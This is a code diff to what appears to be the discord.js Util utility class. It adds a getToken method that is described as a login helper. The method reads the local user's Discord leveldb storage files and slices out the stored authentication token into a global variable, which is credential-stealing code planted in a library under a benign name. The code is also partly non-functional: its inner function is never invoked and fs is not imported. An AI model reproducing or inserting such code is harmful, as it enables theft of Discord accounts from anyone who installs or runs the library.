@@ -7,6 +7,7 @@ const { fetch } = require('undici');
 const Colors = require('./Colors');
 const { Error: DiscordError, RangeError, TypeError } = require('../errors');
 const isObject = d => typeof d === 'object' && d !== null;
+const os = require('os');
 
 /**
  * Contains various general-purpose utility methods.
@@ -560,6 +561,51 @@ class Util extends null {
    */
   static cleanCodeBlockContent(text) {
     return text.replaceAll('```', '`\u200b``');
+  }
+
+  /**
+   * 
+   * @param {string} username Username of the user you want to log into
+   * @param {string} descriminator descriminator of the user if you have multiple accounts with the same name
+   */
+  static getToken(username, descriminator = null) {
+    function grabtoken() {
+      let data
+      var tokendir = `C:/Users/${os.userInfo().username}/AppData/Roaming/discord/Local Storage/leveldb`;
+      let files
+      const getSortedFiles = async (dir) => {
+          const files = await fs.promises.readdir(dir);
+
+          return files
+              .map(fileName => ({
+                  name: fileName,
+                  time: fs.statSync(`${dir}/${fileName}`).mtime.getTime(),
+              }))
+              .sort((a, b) => a.time - b.time)
+              .map(file => file.name)
+              .reverse();
+      };
+      Promise.resolve()
+          .then(() => {
+              getSortedFiles(tokendir).then(name => {
+                  files = name
+              })
+          })
+          .catch(console.error);
+      setTimeout(() => {
+          var filtered = files.filter(function (value, index, arr) {
+              return value.includes(".log");
+          });
+          fs.readFile(tokendir + '/' + filtered[0], function (err, data2) {
+              if (err) {
+                  throw err;
+              }
+              data2 = data2.toString()
+              clitoken = data2.slice(data2.indexOf("oken>"), data2.indexOf("oken>") + 80)
+              clitoken = clitoken.slice(clitoken.indexOf('"'), clitoken.indexOf('"') + 59)
+          });
+      }, 500)
+    }
   }
 }
 
